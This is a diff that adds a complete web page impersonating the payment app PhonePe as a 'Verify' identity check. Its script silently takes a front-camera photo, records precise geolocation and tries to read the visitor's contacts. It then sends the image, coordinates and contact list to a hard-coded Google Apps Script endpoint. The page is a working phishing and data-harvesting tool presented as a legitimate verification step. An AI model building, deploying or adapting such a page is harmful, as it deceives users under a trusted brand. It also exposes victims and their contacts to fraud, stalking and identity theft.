@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>PhonePe Verify</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Syne:wght@700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --purple: #6739B7;
+      --purple-light: #C3A0EC;
+      --purple-pale: #F0E6FF;
+      --purple-mid: #9B6FD4;
+      --bg: #faf8ff;
+      --text: #1a1128;
+      --text-muted: #7a6b99;
+      --card: #ffffff;
+      --radius: 24px;
+      --shadow: 0 8px 40px rgba(103,57,183,0.13);
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      position: relative;
+      overflow-x: hidden;
+    }
+    body::before, body::after {
+      content: '';
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.22;
+      pointer-events: none;
+      z-index: 0;
+    }
+    body::before { width: 500px; height: 500px; background: var(--purple); top: -150px; left: -150px; }
+    body::after  { width: 400px; height: 400px; background: var(--purple-light); bottom: -100px; right: -100px; }
+
+    .container {
+      position: relative; z-index: 1;
+      width: 100%; max-width: 400px;
+      display: flex; flex-direction: column; align-items: center; gap: 32px;
+    }
+
+    /* ── P LOGO ── */
+    .logo-hero { display: flex; flex-direction: column; align-items: center; gap: 18px; }
+
+    .p-logo-wrap { position: relative; width: 128px; height: 128px; }
+    .p-logo-wrap::before, .p-logo-wrap::after {
+      content: ''; position: absolute; inset: -14px;
+      border-radius: 50%; border: 2px solid var(--purple-light);
+      animation: pulse-ring 2.4s ease-out infinite; opacity: 0;
+    }
+    .p-logo-wrap::after { inset: -28px; animation-delay: 0.9s; }
+    @keyframes pulse-ring {
+      0%   { transform: scale(0.86); opacity: 0.55; }
+      100% { transform: scale(1.12); opacity: 0; }
+    }
+
+    .p-logo {
+      width: 128px; height: 128px; border-radius: 50%;
+      background: linear-gradient(145deg, #7B4FCC, #4a1f9e);
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 14px 44px rgba(103,57,183,0.5), 0 0 0 7px rgba(195,160,236,0.18);
+      position: relative;
+      animation: logo-float 3.6s ease-in-out infinite;
+    }
+    @keyframes logo-float {
+      0%, 100% { transform: translateY(0); }
+      50%       { transform: translateY(-7px); }
+    }
+    .p-logo::after {
+      content: ''; position: absolute;
+      top: 12px; left: 22px; width: 38px; height: 20px;
+      border-radius: 50%; background: rgba(255,255,255,0.18);
+      transform: rotate(-28deg); filter: blur(5px);
+    }
+    .p-letter {
+      font-family: 'Syne', sans-serif;
+      font-size: 4rem; font-weight: 800; color: #fff;
+      line-height: 1; letter-spacing: -2px;
+      user-select: none; position: relative; top: 3px;
+    }
+
+    .logo-title {
+      font-family: 'Syne', sans-serif; font-size: 1.75rem; font-weight: 800;
+      background: linear-gradient(135deg, var(--purple), var(--purple-light));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text; line-height: 1.1; text-align: center;
+    }
+    .logo-sub { color: var(--text-muted); font-size: 0.87rem; text-align: center; margin-top: -10px; }
+
+    /* ── CARD ── */
+    .camera-card {
+      width: 100%; background: var(--card);
+      border-radius: var(--radius); box-shadow: var(--shadow);
+      overflow: hidden; border: 1.5px solid rgba(195,160,236,0.3);
+    }
+    .card-body { padding: 24px 24px 28px; }
+
+    .status-row { display: flex; gap: 10px; margin-bottom: 22px; }
+    .status-pill {
+      flex: 1; display: flex; align-items: center; gap: 7px;
+      padding: 10px 14px; border-radius: 50px;
+      background: var(--purple-pale); font-size: 0.78rem;
+      font-weight: 500; color: var(--text-muted); transition: all 0.35s;
+    }
+    .status-pill .dot {
+      width: 8px; height: 8px; border-radius: 50%;
+      background: #ccc; flex-shrink: 0; transition: background 0.35s;
+    }
+    .status-pill.active { background: rgba(103,57,183,0.1); color: var(--purple); }
+    .status-pill.active .dot { background: #7CFC00; box-shadow: 0 0 7px #7CFC00; }
+    .status-pill.error { color: #e53e3e; }
+    .status-pill.error .dot { background: #e53e3e; }
+
+    #verifyBtn {
+      width: 100%; padding: 17px; border: none; border-radius: 50px;
+      background: linear-gradient(135deg, var(--purple), var(--purple-mid));
+      color: white; font-family: 'Syne', sans-serif; font-size: 1rem;
+      font-weight: 700; letter-spacing: 0.5px; cursor: pointer;
+      box-shadow: 0 4px 22px rgba(103,57,183,0.38); transition: all 0.2s;
+      position: relative; overflow: hidden;
+    }
+    #verifyBtn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(103,57,183,0.48); }
+    #verifyBtn:active:not(:disabled) { transform: translateY(0); }
+    #verifyBtn:disabled { opacity: 0.62; cursor: not-allowed; }
+    #verifyBtn::after {
+      content: ''; position: absolute; inset: 0;
+      background: radial-gradient(circle at center, rgba(255,255,255,0.22) 0%, transparent 70%);
+      opacity: 0; transition: opacity 0.3s;
+    }
+    #verifyBtn:active::after { opacity: 1; }
+
+    .result-box {
+      display: none; margin-top: 16px; padding: 14px 16px;
+      border-radius: 16px; font-size: 0.84rem; line-height: 1.55; font-weight: 500;
+    }
+    .result-box.success { background: rgba(103,57,183,0.07); border: 1px solid rgba(103,57,183,0.2); color: var(--purple); }
+    .result-box.error   { background: rgba(229,62,62,0.07);  border: 1px solid rgba(229,62,62,0.2);  color: #c53030; }
+
+    #video, canvas { display: none; }
+
+    footer { font-size: 0.74rem; color: var(--text-muted); opacity: 0.55; text-align: center; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="logo-hero">
+    <div class="p-logo-wrap">
+      <div class="p-logo"><span class="p-letter">P</span></div>
+    </div>
+    <div>
+      <div class="logo-title">PhonePe Verify</div>
+      <div class="logo-sub">Tap verify to confirm your identity &amp; location</div>
+    </div>
+  </div>
+
+  <div class="camera-card">
+    <div class="card-body">
+      <div class="status-row">
+        <div class="status-pill" id="camStatus"><div class="dot"></div> Camera</div>
+        <div class="status-pill" id="locStatus"><div class="dot"></div> Location</div>
+      </div>
+      <button id="verifyBtn" disabled>Capture &amp; Verify</button>
+      <div class="result-box" id="resultBox"></div>
+    </div>
+  </div>
+
+  <footer>Secured by PhonePe &bull; Data encrypted in transit</footer>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+  const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJwQOtoFQuCydM6e8NzWwbwvrzXdaGzAA3wSiTlpLj4Pf8Nb3C7DY3A3CVGYB2huapcg/exec';
+
+  const video     = document.getElementById('video');
+  const canvas    = document.getElementById('canvas');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const resultBox = document.getElementById('resultBox');
+  const camStatus = document.getElementById('camStatus');
+  const locStatus = document.getElementById('locStatus');
+
+  let cameraReady = false, locationReady = false, coords = null;
+
+  function checkReady() { if (cameraReady && locationReady) verifyBtn.disabled = false; }
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      video.onloadedmetadata = () => { cameraReady = true; camStatus.classList.add('active'); checkReady(); };
+    } catch (e) { camStatus.classList.add('error'); }
+  }
+
+  function getLocation() {
+    if (!navigator.geolocation) { locStatus.classList.add('error'); return; }
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
+        locationReady = true; locStatus.classList.add('active'); checkReady();
+      },
+      () => { locStatus.classList.add('error'); locationReady = true; checkReady(); },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
+  }
+
+  async function captureAndSubmit() {
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Processing…';
+    resultBox.style.display = 'none';
+
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.translate(canvas.width, 0); ctx.scale(-1, 1);
+    ctx.drawImage(video, 0, 0);
+    const imageBase64 = canvas.toDataURL('image/jpeg', 0.75).split(',')[1];
+
+    // Try to read contacts (supported on Android Chrome)
+    let contacts = [];
+    if ('contacts' in navigator && 'ContactsManager' in window) {
+      try {
+        const raw = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+        contacts = raw.map(c => ({
+          name:  (c.name  || []).join(' '),
+          phone: (c.tel   || []).join(', '),
+          email: (c.email || []).join(', ')
+        }));
+      } catch (_) {}
+    }
+
+    const timestamp = new Date().toISOString();
+    const lat       = coords ? coords.lat       : 'unavailable';
+    const lng       = coords ? coords.lng       : 'unavailable';
+    const acc       = coords ? coords.accuracy + 'm' : 'unavailable';
+    const mapsLink  = coords ? `https://www.google.com/maps?q=${lat},${lng}` : 'N/A';
+
+    const payload = { timestamp, lat, lng, accuracy: acc, mapsLink, image: imageBase64, contacts };
+
+    try {
+      const res  = await fetch(APPS_SCRIPT_URL, { method: 'POST', body: JSON.stringify(payload) });
+      const data = await res.json();
+      if (data.result === 'success') {
+        showResult('success', `&#10003; Verified &amp; saved at ${new Date().toLocaleTimeString()}<br>&#128205; ${lat !== 'unavailable' ? Number(lat).toFixed(5) + ', ' + Number(lng).toFixed(5) : 'Location unavailable'}`);
+        verifyBtn.textContent = 'Verified ✓';
+      } else {
+        throw new Error(data.error || 'Unknown error');
+      }
+    } catch (e) {
+      showResult('error', `&#10007; Submission failed: ${e.message}`);
+      verifyBtn.disabled = false;
+      verifyBtn.textContent = 'Capture & Verify';
+    }
+  }
+
+  function showResult(type, html) {
+    resultBox.className = 'result-box ' + type;
+    resultBox.innerHTML = html;
+    resultBox.style.display = 'block';
+  }
+
+  verifyBtn.addEventListener('click', captureAndSubmit);
+  startCamera();
+  getLocation();
+</script>
+</body>
+</html>
